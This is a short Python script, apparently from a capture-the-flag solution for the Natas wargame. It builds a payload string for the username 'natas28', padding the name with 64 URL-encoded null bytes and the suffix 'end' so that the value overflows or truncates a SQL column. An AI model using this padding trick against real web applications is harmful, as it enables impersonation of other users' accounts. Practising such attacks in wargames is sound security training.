#Create string that will overflow sql

STRING_LEN = 64
username = "natas28"
out = username

for i in range(0, STRING_LEN):
    out = out + "%00"
    
out = out + "end"
print(out)